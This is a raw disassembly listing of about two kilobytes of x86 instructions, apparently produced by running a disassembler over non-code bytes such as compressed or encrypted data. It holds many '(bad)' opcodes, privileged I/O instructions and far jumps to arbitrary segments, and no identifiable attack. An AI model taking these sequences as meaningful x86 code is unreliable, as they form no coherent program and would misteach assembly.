  423f8e:	xor    bh,BYTE PTR [ebx]
  423f90:	outs   dx,DWORD PTR ds:[esi]
  423f91:	add    BYTE PTR [ecx+0x7afaa5f8],bh
  423f97:	xchg   ecx,eax
  423f98:	mov    al,ds:0x147e605
  423f9d:	add    ebx,DWORD PTR [ebp+0x16]
  423fa0:	addr16 stc 
  423fa2:	int    0xea
  423fa4:	(bad)  
  423fa5:	cmp    eax,0x7a4f269d
  423faa:	push   0x47392e26
  423faf:	or     BYTE PTR [eax-0x36],dl
  423fb2:	enter  0x5e20,0x9b
  423fb6:	lock sub DWORD PTR [edi-0xeb0c06c],eax
  423fbd:	aad    0xfc
  423fbf:	daa    
  423fc0:	outs   dx,DWORD PTR ds:[esi]
  423fc1:	fcomi  st,st(1)
  423fc3:	out    0xd1,al
  423fc5:	cmp    ax,0x4016
  423fc9:	adc    al,0x67
  423fcb:	neg    BYTE PTR [esi-0x45]
  423fce:	call   0x269e:0x4514d36b
  423fd5:	sub    BYTE PTR [edi+ebp*8],al
  423fd8:	sbb    ecx,DWORD PTR [edx]
  423fda:	pop    es
  423fdb:	cmp    ch,BYTE PTR [ebp+eiz*2-0x2ad439d0]
  423fe2:	pusha  
  423fe3:	and    DWORD PTR [edi+0x1e],esi
  423fe6:	cmp    BYTE PTR [eax+0x18],al
  423fe9:	sahf   
  423fea:	xor    ch,BYTE PTR [ebp-0xf]
  423fed:	cmc    
  423fee:	imul   BYTE PTR [eax+0x6f]
  423ff1:	mov    bh,0xb2
  423ff3:	ret    
  423ff4:	mov    dh,0x61
  423ff6:	je     0x424046
  423ff8:	retf   
  423ff9:	push   esp
  423ffa:	add    BYTE PTR [esi+0x7f4a15b0],bh
  424000:	xor    BYTE PTR [edx-0x1aa65359],0x6f
  424007:	mov    eax,ds:0x6e5249a8
  42400c:	lods   al,BYTE PTR ds:[esi]
  42400d:	in     al,0x9d
  42400f:	fcomp  st(0)
  424011:	jne    0x42408d
  424013:	enter  0x387b,0xe9
  424017:	jbe    0x424076
  424019:	pop    ebx
  42401a:	mov    edx,0xf6b6557d
  42401f:	cmp    ebp,DWORD PTR [ebp+eax*4-0x2a]
  424023:	cmp    al,0x6f
  424025:	je     0x42405e
  424027:	xchg   ecx,eax
  424028:	bound  ebp,QWORD PTR ds:0x6754ff15
  42402e:	xor    BYTE PTR [ecx+0x4c],dh
  424031:	pusha  
  424032:	retf   
  424033:	in     eax,0xe2
  424035:	aaa    
  424036:	cs dec esp
  424038:	jge    0x4240b5
  42403a:	clc    
  42403b:	and    edi,edi
  42403d:	enter  0x9a1d,0xa2
  424041:	mov    dl,0xf4
  424043:	add    al,0x32
  424045:	pop    es
  424046:	jmp    0x2404:0xb76132a0
  42404d:	mov    ecx,0x6c159755
  424052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424053:	add    DWORD PTR [edi+0x7d],ebp
  424056:	or     edx,DWORD PTR [eax]
  424058:	xchg   ebp,eax
  424059:	nop
  42405a:	ss (bad) 
  42405c:	cmc    
  42405d:	cdq    
  42405e:	mov    ds:0xb4443a0d,eax
  424063:	fwait
  424064:	icebp  
  424065:	inc    ebx
  424066:	test   DWORD PTR [esi+0x55],0xcb14c370
  42406d:	test   al,0x55
  42406f:	xor    BYTE PTR [esi],ah
  424071:	xor    dh,ch
  424073:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424074:	(bad)  
  424076:	push   cs
  424077:	popa   
  424078:	dec    ebp
  424079:	sub    al,0xcd
  42407b:	mov    DWORD PTR [eax+0x5ab32e67],ecx
  424081:	mov    gs,WORD PTR [ebp-0x80]
  424084:	std    
  424085:	sub    esp,DWORD PTR [edi+0x52]
  424088:	jle    0x424062
  42408a:	cld    
  42408b:	cld    
  42408c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42408d:	jnp    0x42408e
  42408f:	icebp  
  424090:	mov    ecx,cs
  424092:	add    DWORD PTR [edi-0x286f67c3],ecx
  424098:	pushf  
  424099:	cmp    BYTE PTR [ebp-0x3b],ch
  42409c:	ret    0xd1ee
  42409f:	inc    edi
  4240a0:	popa   
  4240a1:	fistp  QWORD PTR [ecx+0x11]
  4240a4:	fidivr WORD PTR [edx+0x74]
  4240a7:	xor    ebp,DWORD PTR [ecx]
  4240a9:	pop    ebp
  4240aa:	out    dx,al
  4240ab:	add    eax,0xd7a4cecb
  4240b0:	mov    bh,0xf4
  4240b2:	in     al,0xac
  4240b4:	add    ecx,edx
  4240b6:	loope  0x42405f
  4240b8:	mov    WORD PTR [edx-0x48e662bc],?
  4240be:	sbb    eax,0x53c806fc
  4240c3:	iret   
  4240c4:	or     BYTE PTR [edx+0x1f6604b0],0x93
  4240cb:	inc    ebp
  4240cc:	pop    esp
  4240cd:	pop    edx
  4240ce:	dec    esi
  4240cf:	ds mov esp,0x300672a5
  4240d5:	push   ds
  4240d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240d7:	adc    ch,ah
  4240d9:	jle    0x4240ee
  4240db:	iret   
  4240dc:	imul   ebx,DWORD PTR [ebx],0xf61dc481
  4240e2:	jmp    0x4240c7
  4240e4:	push   cs
  4240e5:	dec    eax
  4240e6:	xor    ch,0x99
  4240e9:	mov    ch,0x8
  4240eb:	(bad)  [ebx-0x72]
  4240ee:	mov    bl,0x74
  4240f0:	push   es
  4240f1:	out    0xf0,al
  4240f3:	mov    dh,0x46
  4240f5:	js     0x42411c
  4240f7:	test   DWORD PTR [edi-0x7f4820f4],ecx
  4240fd:	xor    BYTE PTR [esp+eax*4-0x10a075e0],cl
  424104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424105:	ins    DWORD PTR es:[edi],dx
  424106:	push   edi
  424107:	jmp    0x4240a3
  424109:	mov    ah,ah
  42410b:	jnp    0x424134
  42410d:	add    esi,DWORD PTR [esi]
  42410f:	or     eax,esi
  424111:	pop    eax
  424112:	call   0xaac7:0x9c9fbbf
  424119:	frstor gs:[esi-0x69]
  42411d:	sbb    ebx,DWORD PTR [edx-0x69]
  424120:	icebp  
  424121:	outs   dx,DWORD PTR ds:[esi]
  424122:	xchg   esi,eax
  424123:	dec    edi
  424124:	shl    al,0xd0
  424127:	js     0x424194
  424129:	inc    eax
  42412a:	int3   
  42412b:	cwde   
  42412c:	ins    BYTE PTR es:[edi],dx
  42412d:	adc    al,BYTE PTR [ebp+0x361c8361]
  424133:	sub    DWORD PTR [eax+0x44131fe],esi
  424139:	add    ch,BYTE PTR [ebp-0x18c99286]
  42413f:	cs clc 
  424141:	fwait
  424142:	mov    ecx,0x3e8d3ec6
  424147:	in     eax,0x6e
  424149:	dec    ax
  42414b:	loope  0x424115
  42414d:	or     BYTE PTR [eax+0xb],bh
  424150:	in     eax,dx
  424151:	push   edi
  424152:	and    al,0xc8
  424154:	mov    bl,0xb4
  424156:	mov    ch,0xcb
  424158:	add    cl,BYTE PTR [esi+eax*8-0x3901e2aa]
  42415f:	pop    ebx
  424160:	mov    ebx,0xae7b9a0c
  424165:	cmp    al,0x83
  424167:	add    BYTE PTR [ecx-0x40],cl
  42416a:	push   0x48
  42416c:	xchg   edx,eax
  42416d:	scas   eax,DWORD PTR es:[edi]
  42416e:	(bad)  
  42416f:	xor    DWORD PTR [ebx],edi
  424171:	push   esi
  424172:	xchg   DWORD PTR cs:[eax-0x15],ebx
  424176:	cmovb  esi,DWORD PTR [ecx+0x43]
  42417a:	adc    BYTE PTR [eax+eiz*1+0x66],dh
  42417e:	repz enter 0xef48,0xd8
  424183:	inc    ebx
  424184:	pop    edx
  424185:	mov    BYTE PTR [ebp+0x6d],al
  424188:	test   BYTE PTR [esi+0x45e817fa],bl
  42418e:	cmp    eax,0x5e59def2
  424193:	xchg   edx,eax
  424194:	jne    0x424213
  424196:	push   esi
  424197:	and    BYTE PTR [edx+eax*8],ch
  42419a:	sub    ch,BYTE PTR [ebp+edx*4-0x6]
  42419e:	push   eax
  42419f:	adc    DWORD PTR [ebp+0x37],ebp
  4241a2:	push   es
  4241a3:	dec    esp
  4241a4:	pop    ds
  4241a5:	mov    dl,0x3c
  4241a7:	icebp  
  4241a8:	fnclex 
  4241aa:	rcl    BYTE PTR [ecx+0x3b256873],1
  4241b0:	sbb    eax,0x464a327b
  4241b5:	data16 mov cl,0xd
  4241b8:	aaa    
  4241b9:	push   esi
  4241ba:	or     eax,0xeeb3e18a
  4241bf:	pop    esi
  4241c0:	sar    ch,cl
  4241c2:	fcom   DWORD PTR [edx-0x4af1c0c0]
  4241c8:	dec    ebp
  4241c9:	sti    
  4241ca:	mov    cl,0xc8
  4241cc:	gs aad 0x4b
  4241cf:	adc    ch,al
  4241d1:	arpl   WORD PTR [esi+0x3a],sp
  4241d4:	xchg   ebp,eax
  4241d5:	push   ebp
  4241d6:	lods   eax,DWORD PTR ds:[esi]
  4241d7:	push   0xdef42586
  4241dc:	cmp    al,0x6a
  4241de:	inc    edx
  4241df:	in     eax,dx
  4241e0:	push   esi
  4241e1:	push   es
  4241e2:	fcom   DWORD PTR [ebx-0x233349f1]
  4241e8:	test   al,0xdc
  4241ea:	ds aas 
  4241ec:	inc    ecx
  4241ed:	mov    ecx,0x40b55ffb
  4241f2:	mov    bl,0xc2
  4241f4:	cmp    ecx,DWORD PTR [edx-0x6ddf453b]
  4241fa:	popa   
  4241fb:	ret    0x6e24
  4241fe:	icebp  
  4241ff:	dec    ecx
  424200:	call   0xb1472796
  424205:	mov    bl,0x94
  424207:	pop    eax
  424208:	fs cld 
  42420a:	outs   dx,BYTE PTR ds:[esi]
  42420b:	mul    BYTE PTR [edx-0x318c9798]
  424211:	(bad)
  424216:	test   DWORD PTR [ebx-0x6d],eax
  424219:	(bad)  
  42421a:	jp     0x424292
  42421c:	push   ebp
  42421d:	add    al,0x98
  42421f:	aaa    
  424220:	pop    ebp
  424221:	cdq    
  424222:	(bad)  
  424224:	dec    edx
  424225:	jecxz  0x424218
  424227:	or     eax,0x23817129
  42422c:	cld    
  42422d:	js     0x42421f
  42422f:	fs jg  0x424270
  424232:	sub    ebx,DWORD PTR [esi+0x52e5efa6]
  424238:	in     eax,dx
  424239:	test   ah,ah
  42423b:	mov    esi,0x676d9873
  424240:	pusha  
  424241:	mov    ecx,0x5a3c77c7
  424246:	inc    esi
  424247:	fcomp  QWORD PTR [ebx+0x6f1dd029]
  42424d:	and    ch,BYTE PTR [esi+ecx*1]
  424250:	or     eax,ecx
  424252:	(bad)  
  424253:	lock push edx
  424255:	inc    esp
  424256:	dec    edx
	...
  42425f:	add    BYTE PTR [eax],al
  424261:	mul    ebp
  424263:	lahf   
  424264:	jp     0x424205
  424266:	jp     0x42425f
  424268:	in     eax,dx
  424269:	sar    DWORD PTR [edi+0x4bc3212c],1
  42426f:	push   cs
  424270:	sub    DWORD PTR [edi-0x51fffe46],ebx
  424276:	add    eax,DWORD PTR [eax]
  424278:	add    BYTE PTR [ecx-0xdd07c3f],al
  42427e:	in     eax,0xf4
  424280:	cmp    DWORD PTR [eax],esi
  424282:	dec    esi
  424283:	ds stos DWORD PTR es:[edi],eax
  424285:	bound  esi,QWORD PTR es:[edx+esi*1+0x78]
  42428a:	cwde   
  42428b:	push   esi
  42428c:	push   0x7c
  42428e:	push   eax
  42428f:	leave  
  424290:	aaa    
  424291:	popa   
  424292:	and    DWORD PTR [ebx-0x47],eax
  424295:	fistp  WORD PTR [eax+0x16]
  424298:	call   0xb003:0x852d206d
  42429f:	(bad)  
  4242a1:	and    DWORD PTR [ebp-0x1815359e],0xbc4b01be
  4242ab:	dec    edx
  4242ac:	dec    edi
  4242ad:	xor    BYTE PTR [ecx+0x6],al
  4242b0:	es cmp al,0x89
  4242b3:	add    BYTE PTR [ecx+0x28],bh
  4242b6:	into   
  4242b7:	sub    BYTE PTR ds:0xf4d5af0,0x4b
  4242be:	mov    bl,0x3a
  4242c0:	sar    BYTE PTR [ecx],1
  4242c2:	ja     0x4242c2
  4242c4:	je     0x424281
  4242c6:	daa    
  4242c7:	lods   eax,DWORD PTR ds:[esi]
  4242c8:	retf   0xe1d5
  4242cb:	mov    BYTE PTR [ebp+0x5a51e32a],dh
  4242d1:	push   ecx
  4242d2:	mov    esp,DWORD PTR [edx]
  4242d4:	jge    0x42434e
  4242d6:	mov    ch,0x29
  4242d8:	sub    DWORD PTR [edx-0x1b81a147],eax
  4242de:	retf   0xe6a2
  4242e1:	fsubr  st(4),st
  4242e3:	ins    BYTE PTR es:[edi],dx
  4242e4:	int    0xe0
  4242e6:	int    0x4a
  4242e8:	push   ss
  4242e9:	dec    eax
  4242ea:	inc    esi
  4242eb:	add    BYTE PTR [ecx+0x43],bh
  4242ee:	lds    edi,FWORD PTR [edx]
  4242f0:	push   es
  4242f1:	jne    0x424297
  4242f3:	push   ds
  4242f4:	mov    ecx,0xdcd76148
  4242f9:	int    0xd4
  4242fb:	inc    ecx
  4242fc:	cmp    al,0xd4
  4242fe:	loop   0x424339
  424300:	and    esp,esp
  424302:	mov    edi,0x54d48df4
  424307:	mov    bh,0x8f
  424309:	sbb    al,0xf7
  42430b:	or     al,0x50
  42430d:	xchg   edi,eax
  42430e:	(bad)  
  42430f:	(bad)  
  424310:	pop    ss
  424311:	pop    ss
  424312:	cmp    esi,DWORD PTR [edx+0x79]
  424315:	mov    ebp,ecx
  424317:	lds    edi,FWORD PTR [esi-0x3f847eb6]
  42431d:	imul   DWORD PTR [edx+ebp*1]
  424320:	lods   eax,DWORD PTR ds:[esi]
  424321:	clc    
  424322:	jge    0x4243a1
  424324:	cmc    
  424325:	cld    
  424326:	scas   eax,DWORD PTR es:[edi]
  424327:	adc    ecx,ebx
  424329:	test   eax,0xdcfc17f5
  42432e:	jg     0x424329
  424330:	jnp    0x4242e2
  424332:	mov    eax,ds:0x93c38fd5
  424337:	or     DWORD PTR [eax-0x3b82fdfc],edi
  42433d:	lods   al,BYTE PTR ds:[esi]
  42433e:	jmp    0x4b0e6dcc
  424343:	sbb    bl,BYTE PTR [bp+si+0xdca]
  424348:	in     eax,0x2c
  42434a:	jo     0x42436c
  42434c:	or     BYTE PTR [eax-0x24e5c995],bh
  424352:	in     eax,0x74
  424354:	add    al,0xfc
  424356:	push   0x5f
  424358:	lods   eax,DWORD PTR ds:[esi]
  424359:	je     0x42436c
  42435b:	icebp  
  42435c:	xchg   esi,eax
  42435d:	adc    eax,0xf712fc88
  424362:	stos   DWORD PTR es:[edi],eax
  424363:	mov    al,0xd8
  424365:	fimul  WORD PTR [edi+0x3da318f]
  42436b:	aaa    
  42436c:	fisubr DWORD PTR [edi-0x15]
  42436f:	lock loopne 0x4243d5
  424372:	outs   dx,BYTE PTR ds:[esi]
  424373:	jmp    0x1176d8f8
  424378:	push   edx
  424379:	sbb    BYTE PTR [eax],dh
  42437b:	stc    
  42437c:	test   al,bh
  42437e:	add    esi,DWORD PTR [edx-0x68]
  424381:	scas   eax,DWORD PTR es:[edi]
  424382:	jnp    0x4243d4
  424384:	xchg   DWORD PTR [ebx],eax
  424386:	std    
  424387:	inc    ebx
  424388:	push   ss
  424389:	arpl   WORD PTR [edi],si
  42438b:	or     bl,BYTE PTR [edx-0x695c072b]
  424391:	push   ebp
  424392:	inc    esp
  424393:	sbb    BYTE PTR [esp+ecx*2+0x4f],cl
  424397:	ret    0xcb2
  42439a:	ds je  0x4243ae
  42439d:	ins    BYTE PTR es:[edi],dx
  42439e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243a0:	and    ah,BYTE PTR [ecx+0x5dffdff5]
  4243a6:	mov    esi,0x42a4ff58
  4243ab:	jl     0x424352
  4243ad:	inc    ebx
  4243ae:	mov    BYTE PTR [eax+0x79],dh
  4243b1:	add    DWORD PTR [eax],ebp
  4243b3:	or     eax,0xc89ee494
  4243b8:	jp     0x424368
  4243ba:	mov    ebp,0x90a10a35
  4243bf:	adc    ebx,DWORD PTR [eax*8-0x57598d61]
  4243c6:	pop    ecx
  4243c7:	ss xchg ah,dh
  4243ca:	ja     0x42437a
  4243cc:	mov    al,0xb0
  4243ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4243cf:	mov    eax,0x1d1a2f4c
  4243d4:	and    BYTE PTR [ecx],cl
  4243d6:	pop    ss
  4243d7:	jmp    0x4243eb
  4243d9:	fbld   TBYTE PTR [ebx-0x5f]
  4243dc:	or     BYTE PTR ds:0x2607be34,ch
  4243e2:	mov    BYTE PTR [edx],dl
  4243e4:	xlat   BYTE PTR ds:[ebx]
  4243e5:	test   bl,dl
  4243e7:	test   eax,0x9320e7cd
  4243ec:	and    eax,0x64e5e31d
  4243f1:	cli    
  4243f2:	sbb    al,0x3a
  4243f4:	call   0x8661039f
  4243f9:	fstp   TBYTE PTR [ecx+0x50]
  4243fc:	xor    al,0x7e
  4243ff:	adc    BYTE PTR [esi+esi*2],al
  424402:	ficom  DWORD PTR [ebp+0x25eb6ccf]
  424408:	out    dx,al
  424409:	adc    DWORD PTR [ecx+0x64c400eb],0xffffff99
  424410:	jo     0x42443d
  424412:	xor    al,BYTE PTR [ebx]
  424414:	sbb    al,0xe6
  424416:	adc    DWORD PTR [ebp-0x4e30592],edi
  42441c:	mov    ?,WORD PTR [ebx-0x61fc199a]
  424422:	mov    BYTE PTR [ebx],dh
  424424:	adc    cl,BYTE PTR [esi]
  424426:	pop    ss
  424427:	xchg   ecx,eax
  424428:	jae    0x4244a5
  42442a:	jge    0x4243b3
  42442c:	adc    esi,DWORD PTR [edx]
  42442e:	out    dx,al
  42442f:	loope  0x424495
  424431:	adc    dl,dh
  424433:	popf   
  424434:	push   esi
  424435:	xchg   ebx,eax
  424436:	and    al,0x8c
  424438:	lods   al,BYTE PTR ds:[esi]
  424439:	adc    esp,DWORD PTR [eax-0x44]
  42443c:	xor    al,0x85
  42443e:	and    eax,0xcb83a9d1
  424443:	loope  0x424499
  424445:	cmp    bl,BYTE PTR [edi-0x45808d1c]
  42444b:	lds    ecx,FWORD PTR [ecx-0x17560d3f]
  424451:	ins    DWORD PTR es:[edi],dx
  424452:	inc    edi
  424453:	pusha  
  424454:	sbb    al,0xbe
  424456:	xchg   BYTE PTR [edi],dh
  424458:	rcl    DWORD PTR [esi-0xf59303b],1
  42445e:	lods   al,BYTE PTR ds:[esi]
  42445f:	mov    ds:0x3f286543,al
  424464:	lds    ebx,FWORD PTR [eax]
  424466:	jo     0x424418
  424468:	ins    DWORD PTR es:[edi],dx
  424469:	push   0xa82827a0
  42446e:	xchg   al,ah
  424470:	shr    esp,1
  424472:	push   es
  424473:	mov    edx,0xea9f7e07
  424478:	fnstsw WORD PTR [esi+0x7577cc4e]
  42447e:	imul   eax,ecx,0x11
  424481:	out    dx,al
  424482:	inc    edi
  424483:	outs   dx,BYTE PTR ds:[esi]
  424484:	and    DWORD PTR [ebx],ebx
  424486:	std    
  424487:	fs scas al,BYTE PTR es:[edi]
  424489:	mov    cl,0xf1
  42448b:	jbe    0x42450c
  42448d:	pusha  
  42448e:	add    BYTE PTR [edi],al
  424490:	xor    cl,BYTE PTR [ecx+0x317dfcd3]
  424496:	and    BYTE PTR [edi+0x9726619],ch
  42449c:	inc    ebx
  42449d:	ds sub al,0x45
  4244a0:	(bad)  
  4244a1:	dec    edx
  4244a2:	jnp    0x4244be
  4244a4:	dec    ebx
  4244a5:	push   0xd
  4244a7:	ficomp WORD PTR ds:0xc9e56ed5
  4244ad:	icebp  
  4244ae:	xor    DWORD PTR [eax],esi
  4244b0:	push   ebp
  4244b1:	xchg   ebp,eax
  4244b2:	stos   DWORD PTR es:[edi],eax
  4244b3:	pop    ds
  4244b4:	fwait
  4244b5:	or     cl,BYTE PTR [eax+esi*4-0x43ff80ca]
  4244bc:	jmp    0xae847c78
  4244c1:	jge    0x4244fd
  4244c3:	or     BYTE PTR [ebx],dh
  4244c5:	addr16 mov ecx,0x50106b93
  4244cb:	push   eax
  4244cc:	jge    0x424524
  4244ce:	test   DWORD PTR [ecx],esi
  4244d0:	shl    esp,1
  4244d2:	cmp    eax,0x88615ec6
  4244d7:	xor    ebx,edi
  4244d9:	or     BYTE PTR [ebx],ch
  4244db:	pop    ds
  4244dc:	sbb    ah,ch
  4244de:	sbb    BYTE PTR [edx-0x4],ah
  4244e1:	sub    al,0x46
  4244e3:	push   0x63506b1d
  4244e8:	xchg   ebx,ebx
  4244ea:	cmp    DWORD PTR [eiz*2-0x66c216a3],ebx
  4244f1:	adc    eax,0x52e2f969
  4244f6:	(bad)  
  4244f7:	jmp    0x45e3:0xbc7817a5
  4244fe:	jp     0x424505
  424500:	sti    
  424501:	mov    esp,DWORD PTR [ecx]
  424503:	xor    ebp,DWORD PTR [ebx]
  424505:	jl     0x424530
  424507:	sbb    ch,al
  424509:	test   BYTE PTR [ebx-0x74e8026d],al
  42450f:	test   DWORD PTR [ebx-0xf],0x713d3889
  424516:	xchg   ebp,eax
  424517:	add    DWORD PTR [eax+0x32dbce46],eax
  42451d:	lods   eax,DWORD PTR ds:[esi]
  42451e:	mov    ds:0x9e4d851c,eax
  424523:	or     DWORD PTR [ebx-0x1a93875],ebx
  424529:	int    0xe9
  42452b:	cwde   
  42452c:	daa    
  42452d:	jmp    0xafd:0x45bb9ed9
  424534:	shr    DWORD PTR [esi-0x54],1
  424537:	loope  0x424561
  424539:	daa    
  42453a:	ret    
  42453b:	mov    esp,0xba79fd83
  424540:	fsub   QWORD PTR [edx-0x70]
  424543:	jmp    0x424598
  424545:	gs pop edi
  424547:	popa   
  424548:	adc    DWORD PTR [ebp+0x5f],0x5a
  42454c:	shl    BYTE PTR [esi-0x1a96a841],1
  424552:	dec    edx
  424553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424554:	shl    DWORD PTR [edx+0x69bc8bc7],1
  42455a:	test   al,0x53
  42455c:	clc    
  42455d:	xor    al,0x45
  42455f:	adc    BYTE PTR [eax],bl
  424561:	cwde   
  424562:	dec    edi
  424563:	bound  eax,QWORD PTR [ecx+0x27]
  424566:	das    
  424567:	gs adc esp,edx
  42456a:	pop    ecx
  42456b:	mov    ah,0x9c
  42456d:	sub    ah,BYTE PTR [eax+edx*2]
  424570:	and    bl,dh
  424572:	stc    
  424573:	xchg   DWORD PTR [esi],ebp
  424575:	(bad)  
  424577:	stos   BYTE PTR es:[edi],al
  424578:	call   0xff4a0ec7
  42457d:	das    
  42457e:	adc    eax,0xeed27e55
  424583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424584:	inc    ebx
  424585:	adc    DWORD PTR [edx],ebx
  424587:	fistp  WORD PTR [ecx]
  424589:	sti    
  42458a:	data16 out 0x52,al
  42458d:	stos   BYTE PTR es:[edi],al
  42458e:	xchg   ecx,eax
  42458f:	xchg   esi,eax
  424590:	mov    esp,0x700d8166
  424595:	in     al,dx
  424596:	sbb    cl,BYTE PTR [ebx+0x33db79ca]
  42459c:	inc    esi
  42459d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42459e:	dec    ebp
  42459f:	pop    ds
  4245a0:	leave  
  4245a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245a2:	fistp  QWORD PTR ds:0x7bf12893
  4245a8:	rcl    bh,0xb5
  4245ab:	jl     0x424557
  4245ad:	push   ss
  4245ae:	daa    
  4245af:	dec    ebp
  4245b0:	pop    edi
  4245b1:	das    
  4245b2:	add    edx,0xfffffffa
  4245b5:	popf   
  4245b6:	jo     0x42459e
  4245b8:	dec    BYTE PTR [ebx+edx*2]
  4245bb:	pop    esi
  4245bc:	rcr    bl,cl
  4245be:	pushf  
  4245bf:	scas   eax,DWORD PTR es:[edi]
  4245c0:	outs   dx,BYTE PTR ds:[esi]
  4245c1:	push   ebx
  4245c2:	sar    ch,1
  4245c4:	int3   
  4245c5:	mov    cl,0xfc
  4245c7:	cmp    al,BYTE PTR [ebp+0x347908f3]
  4245cd:	pop    ecx
  4245ce:	jge    0x4245ac
  4245d0:	pop    ss
  4245d1:	je     0x4245e2
  4245d3:	mov    ds:0xf656be43,al
  4245d8:	aas    
  4245d9:	xchg   ebx,edi
  4245db:	dec    edi
  4245dc:	js     0x424602
  4245de:	push   eax
  4245df:	jno    0x42465a
  4245e1:	or     BYTE PTR [ebx-0x52],al
  4245e4:	fstp   st(7)
  4245e6:	sar    BYTE PTR [ecx-0x2aa0d301],1
  4245ec:	ja     0x424633
  4245ee:	or     BYTE PTR [esi],bh
  4245f0:	bound  esi,QWORD PTR [esi+ebx*1-0x34]
  4245f4:	and    bh,0x6e
  4245f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245f8:	mov    bl,0x20
  4245fa:	adc    eax,0x6fa8d696
  4245ff:	pop    edi
  424600:	cwde   
  424601:	inc    edx
  424602:	test   al,0xe8
  424604:	mov    ah,0xfd
  424606:	ss mov eax,0xbe5c63a4
  42460c:	jne    0x4245f5
  42460e:	ss fwait
  424610:	std    
  424611:	pop    ds
  424612:	push   ds
  424613:	lods   al,BYTE PTR ds:[esi]
  424614:	mov    esp,0xa9ad925b
  424619:	or     BYTE PTR [ecx+0x5f],dl
  42461c:	sbb    BYTE PTR [ebx],bh
  42461e:	fsub   DWORD PTR [ebx]
  424620:	xor    al,0xde
  424622:	xchg   edi,edx
  424624:	sub    al,0x46
  424626:	jne    0x424628
	...
  424630:	add    BYTE PTR [ebx-0x71],ch
  424633:	mov    bh,BYTE PTR [esi+ebp*8+0x7d]
  424637:	call   FWORD PTR [edi+0x4fc17c56]
  42463d:	retf   
  42463e:	mov    ch,0xda
  424640:	das    
  424641:	dec    ebp
  424642:	mov    esi,0x3ae0001
  424647:	add    BYTE PTR [eax],al
  424649:	stos   BYTE PTR es:[edi],al
  42464a:	mov    cl,0xbd
  42464c:	das    
  42464d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42464e:	int3   
  42464f:	inc    eax
  424650:	aaa    
  424651:	sbb    ch,bl
  424653:	lds    eax,FWORD PTR [esi+eax*4+0x21350edd]
  42465a:	pop    DWORD PTR [ebx]
  42465c:	imul   edx,edx,0x6
  42465f:	mov    DWORD PTR [eax-0x744c7687],edi
  424665:	mov    ecx,0x61d56ca2
  42466a:	in     eax,0xe7
  42466c:	xlat   BYTE PTR ds:[ebx]
  42466d:	xchg   BYTE PTR [ecx+0x32a7b830],ah
  424673:	(bad)  
  424674:	stc    
  424675:	dec    esp
  424676:	xor    esp,DWORD PTR ds:0xd0335342
  42467c:	loope  0x424642
  42467e:	outs   dx,BYTE PTR ds:[esi]
  42467f:	cmp    eax,0xe4962380
  424684:	lods   eax,DWORD PTR ds:[esi]
  424685:	xor    al,0x5a
  424687:	mov    ecx,0xe85c10de
  42468c:	sub    al,0x49
  42468e:	scas   eax,DWORD PTR es:[edi]
  42468f:	int3   
  424690:	jecxz  0x4246cb
  424692:	aam    0xdd
  424694:	pop    ecx
  424695:	sub    dl,BYTE PTR [edx+0x24]
  424698:	fdivr  st(5),st
  42469a:	into   
  42469b:	and    ah,0x7d
  42469e:	es into 
  4246a0:	push   0xffffff97
  4246a2:	in     al,dx
  4246a3:	sbb    DWORD PTR [edi-0x3f],0x2b00ebe6
  4246aa:	and    esi,DWORD PTR [edi]
  4246ac:	fstp   DWORD PTR ds:0x3a28f16b
  4246b2:	push   cs
  4246b3:	cs push cs
  4246b5:	inc    ecx
  4246b6:	jnp    0x42464a
  4246b8:	adc    ah,ch
  4246ba:	push   esp
  4246bb:	sub    DWORD PTR [edi],0xffffffcf
  4246be:	not    bh
  4246c0:	xor    al,0x22
  4246c2:	mov    dl,0x3
  4246c4:	shl    DWORD PTR [edx+0x20303297],cl
  4246ca:	mov    ch,0x91
  4246cc:	mov    edx,0x1ddec48d
  4246d1:	add    eax,0x779741e1
  4246d6:	pop    esi
  4246d7:	call   0x30c0:0xbf680b81
  4246de:	push   ebp
  4246df:	pop    ds
  4246e0:	int    0xe4
  4246e2:	int    0x2
  4246e4:	leave  
  4246e5:	(bad)  
  4246e6:	pop    ebp
  4246e7:	add    BYTE PTR [edi-0x3b31cfb8],cl
  4246ed:	mov    esp,0x9debc126
  4246f2:	(bad)  
  4246f3:	in     eax,dx
  4246f4:	outs   dx,DWORD PTR ds:[esi]
  4246f5:	ins    DWORD PTR es:[edi],dx
  4246f6:	xor    DWORD PTR [ebp-0x55b4f0dd],edi
  4246fc:	mov    bl,0xe7
  4246fe:	ret    0x2c89
  424701:	out    dx,al
  424702:	pop    es
  424703:	mov    ebp,0xf144c1a4
  424708:	push   0xffffffde
  42470a:	jmp    0x9e16:0xd39fffd3
  424711:	sub    BYTE PTR [esi+eax*8],bl
  424714:	xor    al,0xac
  424716:	bound  edi,QWORD PTR [ecx]
  424718:	fdivr  QWORD PTR [eax+0x194c99cb]
  42471e:	sbb    eax,DWORD PTR [esp+eiz*2-0x26a04344]
  424725:	jne    0x424775
  424727:	and    al,0x68
  424729:	xchg   edi,eax
  42472a:	mov    eax,ds:0xaf3015c9
  42472f:	xor    al,0x4c
  424731:	icebp  
  424732:	pop    edx
  424733:	xor    eax,0xc69271d3
  424738:	push   edi
  424739:	sub    al,0x33
  42473b:	pop    ebx
  42473c:	int    0x55
  42473e:	adc    eax,0x4cb25cf3
  424743:	sbb    DWORD PTR [edi-0x45],ecx
  424746:	pusha  
  424747:	clc    
  424748:	ja     0x4247c4
  42474a:	out    0xb,eax
  42474c:	test   edi,esp
  42474e:	sub    esp,eax
  424750:	jg     0x42475c
  424752:	mov    ecx,0xa87419e9
  424757:	nop
  424758:	jmp    0x8a864bdd
  42475d:	xchg   edi,eax
  42475e:	xor    dl,BYTE PTR [esi]
  424760:	or     al,0x20
  424762:	rcr    DWORD PTR [ecx-0x609ffaa0],1
  424768:	mov    ch,0xe7
